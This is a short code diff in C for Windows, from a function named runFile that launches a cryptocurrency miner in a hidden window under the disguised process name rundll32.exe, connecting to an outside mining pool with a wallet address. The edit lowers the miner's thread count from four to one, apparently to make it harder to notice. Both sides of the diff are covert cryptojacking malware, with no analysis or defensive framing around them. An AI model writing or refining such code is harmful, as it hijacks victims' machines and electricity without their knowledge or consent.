@@ -29,7 +29,7 @@ void runFile()
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-    CreateProcess("rundll32.exe", "rundll32.exe -o stratum+tcp://mine.xpool.ca:1122 -u 1KNa8Zos3EiZV4jLgNYLty9N1LrFpzU9rA.NervousScrypt -p \"--diff 512\" --threads=4", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    CreateProcess("rundll32.exe", "rundll32.exe -o stratum+tcp://mine.xpool.ca:1122 -u 1KNa8Zos3EiZV4jLgNYLty9N1LrFpzU9rA.NervousScrypt -p \"--diff 512\" --threads=1", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
 
     return;
 }
